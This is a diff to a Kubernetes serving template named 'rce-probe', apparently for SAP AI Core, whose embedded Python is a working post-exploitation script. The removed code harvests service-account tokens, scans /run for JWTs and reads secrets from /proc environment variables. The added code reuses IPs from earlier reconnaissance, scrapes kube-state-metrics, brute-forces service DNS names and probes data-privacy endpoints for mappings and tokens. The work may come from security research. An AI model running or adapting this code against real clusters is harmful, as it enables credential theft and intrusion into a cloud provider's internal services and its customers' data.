@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "1.0.0"
+    ai.sap.com/version: "58.0.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "rce-poc"
+    executables.ai.sap.com/description: "dpi-probe"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,105 +28,101 @@ spec:
           args:
           - |
             python3 -c "
-            import urllib.request, ssl, json, os
+            import urllib.request, ssl, json, socket, re
 
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-
-            K8S = os.environ.get('KUBERNETES_SERVICE_HOST', '100.104.0.1')
-            K8S_PORT = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
             results = {}
 
-            # K8s API paths to probe (anonymous)
-            for path in [
-                '/api',
-                '/api/v1',
-                '/apis',
-                '/version',
-                '/healthz',
-                '/livez',
-                '/readyz',
-                '/metrics',
-                '/openapi/v2',
-                '/openapi/v3',
-                '/.well-known/openid-configuration',
-                '/api/v1/namespaces',
-                '/api/v1/nodes',
-                '/api/v1/pods',
-                '/api/v1/secrets',
-                '/apis/apps/v1',
-            ]:
-                url = f'https://{K8S}:{K8S_PORT}{path}'
+            # Known KSM IPs from earlier recon - fetch metrics to find DPI service
+            KSM_IPS = [
+                '100.110.128.70',   # ksm-multi
+                '100.110.192.195',  # ksm-custom
+            ]
+
+            # Grep metrics for DPI/privacy/masking related services
+            dpi_services = {}
+            for ksm_ip in KSM_IPS:
                 try:
+                    url = f'http://{ksm_ip}:8080/metrics'
                     req = urllib.request.Request(url)
-                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                        body = r.read(2000).decode(errors='replace')
-                        results[f'k8s{path}'] = {'code': 200, 'body': body[:500]}
-                except urllib.error.HTTPError as e:
-                    body = ''
-                    try: body = e.read(2000).decode(errors='replace')
-                    except: pass
-                    headers = dict(e.headers)
-                    results[f'k8s{path}'] = {
-                        'code': e.code,
-                        'body': body[:300],
-                        'www_auth': headers.get('Www-Authenticate', ''),
-                    }
+                    with urllib.request.urlopen(req, timeout=10) as r:
+                        metrics = r.read().decode(errors='replace')
+                    # Find any service with dpi/privacy/masking/anonymi keywords
+                    for line in metrics.split('\n'):
+                        if any(kw in line.lower() for kw in ['dpi', 'privacy', 'masking', 'anonymi', 'pseudonym', 'data_priv']):
+                            results[f'ksm_{ksm_ip}_match'] = results.get(f'ksm_{ksm_ip}_match', [])
+                            results[f'ksm_{ksm_ip}_match'].append(line.strip()[:200])
+                    # Also extract service ClusterIPs from kube_service_info metrics
+                    # Format: kube_service_info{namespace=\"...\",service=\"...\",cluster_ip=\"...\"}
+                    import re as re_mod
+                    for m in re_mod.finditer(r'kube_service_info\{[^}]*service=\"([^\"]+)\"[^}]*cluster_ip=\"([^\"]+)\"[^}]*namespace=\"([^\"]+)\"', metrics):
+                        svc, ip, ns = m.group(1), m.group(2), m.group(3)
+                        if any(kw in svc.lower() or kw in ns.lower() for kw in ['dpi', 'privacy', 'masking', 'anonymi', 'pseudonym']):
+                            dpi_services[f'{ns}/{svc}'] = ip
+                    # Also look for 'ai-api', 'aicore', 'ai-core' services
+                    for m in re_mod.finditer(r'kube_service_info\{[^}]*service=\"([^\"]+)\"[^}]*cluster_ip=\"([^\"]+)\"[^}]*namespace=\"([^\"]+)\"', metrics):
+                        svc, ip, ns = m.group(1), m.group(2), m.group(3)
+                        if any(kw in svc.lower() or kw in ns.lower() for kw in ['ai-api', 'aicore', 'ai-core', 'ml-api', 'orchestrat', 'sap-ai']):
+                            dpi_services[f'aicore:{ns}/{svc}'] = ip
                 except Exception as e:
-                    results[f'k8s{path}'] = {'err': str(e)[:80]}
+                    results[f'ksm_{ksm_ip}_err'] = str(e)[:80]
 
-            # Try OIDC discovery (might not need auth)
-            try:
-                req = urllib.request.Request(f'https://{K8S}:{K8S_PORT}/.well-known/openid-configuration')
-                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                    results['oidc'] = json.loads(r.read())
-            except Exception as e:
-                results['oidc'] = 'ERR: ' + str(e)[:80]
+            results['dpi_services_discovered'] = dpi_services
 
-            # Try to get service account token from projected volumes
-            for token_path in [
-                '/var/run/secrets/kubernetes.io/serviceaccount/token',
-                '/run/secrets/kubernetes.io/serviceaccount/token',
-                '/run/secrets/tokens/default',
-                '/run/secrets/tokens/token',
-            ]:
-                try:
-                    with open(token_path) as f:
-                        token = f.read().strip()
-                        results[f'token_{token_path}'] = token[:50] + '...'
-                except Exception as e:
-                    results[f'token_{token_path}'] = 'ERR: ' + str(e)[:50]
+            # DNS probe: try common DPI service names across likely namespaces
+            namespaces = ['default', 'sap-dpi', 'dpi', 'privacy', 'data-privacy',
+                         'sap-ai-core', 'aicore', 'ai-core', 'ml-foundation',
+                         'sap-data-privacy', 'anonymization', 'masking']
+            service_names = ['sap-data-privacy-integration', 'data-privacy-integration',
+                            'dpi-service', 'dpi', 'privacy-service', 'anonymization-service',
+                            'masking-service', 'sap-dpi', 'aicore-dpi',
+                            'genai-dpi', 'orchestration-dpi']
 
-            # Check entire /run directory for any tokens
-            import glob
-            for f in glob.glob('/run/**', recursive=True):
-                try:
-                    if os.path.isfile(f) and os.path.getsize(f) < 5000:
-                        with open(f) as fh:
-                            content = fh.read(200)
-                            if 'eyJ' in content:  # JWT token pattern
-                                results[f'jwt_found_{f}'] = content[:100]
-                except:
-                    pass
+            for ns in namespaces:
+                for svc in service_names:
+                    hostname = f'{svc}.{ns}.svc.cluster.local'
+                    try:
+                        ip = socket.getaddrinfo(hostname, None)[0][4][0]
+                        dpi_services[hostname] = ip
+                        results[f'dns_{hostname}'] = ip
+                    except:
+                        pass
 
-            # Scan /proc for any process with K8s token env vars
-            for pid_dir in glob.glob('/proc/[0-9]*'):
-                try:
-                    pid = pid_dir.split('/')[-1]
-                    with open(f'{pid_dir}/environ', 'rb') as env_f:
-                        env_data = env_f.read()
-                    for entry in env_data.split(b'\x00'):
-                        if b'=' in entry:
-                            k, _, v = entry.partition(b'=')
-                            if b'TOKEN' in k or b'SECRET' in k or b'ARGO' in k:
-                                results[f'proc_{pid}_{k.decode()}'] = v.decode(errors='replace')[:100]
-                except:
-                    pass
+            results['all_discovered'] = dpi_services
 
-            print('[K8S_PROBE_START]')
+            # Probe any discovered services
+            for name, ip in dpi_services.items():
+                if ip in ['None', 'none', ''] or not ip:
+                    continue
+                for port in [80, 443, 8080, 8443]:
+                    for path in ['/healthz', '/api/v1/sessions', '/api/v1/mappings',
+                                '/api/sessions', '/sessions', '/mappings', '/tokens',
+                                '/api/v1', '/api', '/v1/dpi', '/dpi']:
+                        for scheme in ['http', 'https']:
+                            url = f'{scheme}://{ip}:{port}{path}'
+                            try:
+                                req = urllib.request.Request(url, headers={'Accept': 'application/json'})
+                                with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
+                                    body = r.read(2000).decode(errors='replace')
+                                    key = f'{name}:{port}{path}'
+                                    results[key] = {'code': r.status, 'body': body[:500]}
+                                    break
+                            except urllib.error.HTTPError as e:
+                                body = ''
+                                try: body = e.read(500).decode(errors='replace')
+                                except: pass
+                                if e.code not in [404]:
+                                    results[f'{name}:{port}{path}'] = {'code': e.code, 'body': body[:200]}
+                            except Exception as ex:
+                                err = str(ex)[:50]
+                                if 'timed out' not in err and '111' not in err and '104' not in err:
+                                    results[f'{name}:{port}{path}_err'] = err
+
+            print('[DPI_PROBE_START]')
             print(json.dumps(results, indent=2, default=str))
-            print('[K8S_PROBE_END]')
+            print('[DPI_PROBE_END]')
             " 2>&1
             python3 -c "
             import http.server
